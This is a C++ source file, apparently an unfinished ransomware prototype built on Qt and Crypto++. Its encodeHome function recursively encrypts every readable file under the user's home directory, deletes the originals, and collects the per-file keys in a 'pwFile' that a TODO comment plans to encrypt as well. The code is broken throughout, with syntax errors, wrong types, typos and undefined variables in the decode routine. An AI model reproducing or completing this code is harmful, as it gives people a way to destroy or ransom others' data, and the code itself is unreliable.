#include "osrng.h"

void encodeDir(QDir dir, QFile pwFile)
{
	QList<QFileInfo> files = dir.entryInfoList();
	for (int i=0; i<files.length(); i++)
	{
		QFileInfo file = files.at(i);
		if (file.isFile() && file.isReadable())
		{
			encodeFile(QFile(file.absoluteFilePath()), pwFile);
		}
		else if (file.isDir() && file.isReadable)
		{
			encodeDir(QDir(file.absoluteFilePath()), pwFile);
		}
	}
}

void encodeFile(QFile file, QFile pwFile)
{
	char* pw[256];
	char* salt[1024];
	CryptoPP::AutoSeededRandomPool rng;
	rng.GenerateBlock(pw, 256);
	rng.GenerateBlock(salt, 1024);
	QFile out(file.absolutPath()+".enc");
	out.open(QIODevice::WriteOnly);
	out.write(salt, 1024);
	Ring ring((const unsigned char*)pw, 256, (const unsigned char*)salt, 1024, 1024);
	unsigned int treated = 0;
	char buf[1024]
	file.open(QIODevice::ReadOnly);
	while (treated < file.size())
	{
		unsigned int readSize = 1024;
		if (treated+readSize >= file.size())
		{
			readSize = file.size()-treated;
		}
		file.read(buf, readSize);
		ring.encode((unsigned char*)buf, readSize);
		out.write(buf, readSize);
		treated += readSize;
	}
	file.close();
	out.close();
	pwFile.write(out.absolutePath());
	pwFile.write('\n', 1);
	pwFile.write(pw, 256);
	pwFile.write('\n', 1);
	pwFile.flush();
	file.remove();
}

void encodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "pwFile");
assert(!pwFile.exists());
	pwFile.open(QIODevice::WriteOnly);
	encodeDir(QDir::home(), pwFile);
	pwFile.close();
//TODO encode pwFile
}

void decodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "pwFile");
assert(pwFile.exists());
	pwFile.open(QIODevice::ReadOnly);
//TODO decode pwFile
	unsigned int treated = 0;
	while (treated < pwFile.size())
	{
		char filename[1024];
		char outfilename[1024];
		treated += pwFile.readLine(filename, 1024);
		strcpy(outfilename, filename);
		outfilename[strlen(outfilename)-3] = '\0';
		treated += pwFile.seek(pwFile.pos()+1);
		char pw[256];
		treated += pwFile.read(pw, 256);
		treated += pwFile.seek(pwFile.pos()+1);
		QFile in(filename);
		in.open(QIODevice::ReadOnly);
		QFile out(filename);
		out.open(QIODevice::WriteOnly);
		char salt[1024];
		unsigned int inTreated = 0;
		inTreated += in.read(salt, 1024);
		while (inTreated < in.size())
		{
			if (inTreated+readSize >= in.size())
			{
				readSize = in.size()-inTreated;
			}
			char buf[readSize];
			in.read(buf, readSize)
			ring.decode(buf, readSize);
			out.write(buf, readSize);
			inTreated += readSize;
		}
		in.close();
		out.close();
		in.remove();
	}
	pwFile.close();
	pwFile.remove();
}
